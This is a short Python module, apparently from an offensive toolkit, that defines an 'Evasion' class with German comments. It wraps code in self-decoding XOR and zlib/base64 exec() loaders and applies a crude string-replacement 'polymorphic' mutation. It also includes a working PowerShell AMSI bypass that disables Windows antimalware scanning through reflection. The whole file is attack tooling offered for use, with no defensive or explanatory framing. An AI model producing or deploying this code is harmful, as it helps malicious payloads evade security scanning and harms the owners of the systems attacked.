#!/usr/bin/env python3
import base64
import random
import string
import zlib

class Evasion:
    @staticmethod
    def xor_obfuscate(code, key=None):
        """Verschlüsselt Python-Code mit XOR."""
        if key is None:
            key = random.randint(1, 255)
        encrypted = ''.join(chr(ord(c) ^ key) for c in code)
        decoder = f"key={key};exec(''.join(chr(ord(c)^key) for c in '{encrypted}'))"
        return decoder

    @staticmethod
    def base64_obfuscate(code):
        """Komprimiert und Base64-kodiert Python-Code."""
        compressed = zlib.compress(code.encode())
        b64 = base64.b64encode(compressed).decode()
        decoder = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{b64}')))"
        return decoder

    @staticmethod
    def amsi_bypass_powershell():
        """AMSI-Bypass für PowerShell."""
        return '''
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
        $d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
        $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
        '''

    @staticmethod
    def generate_polymorphic(code, iterations=3):
        """Einfache polymorphe Mutation: String-Austausch."""
        mutated = code
        for _ in range(iterations):
            mutated = mutated.replace("print", "display")
            mutated = mutated.replace("exec", "execute")
        return mutated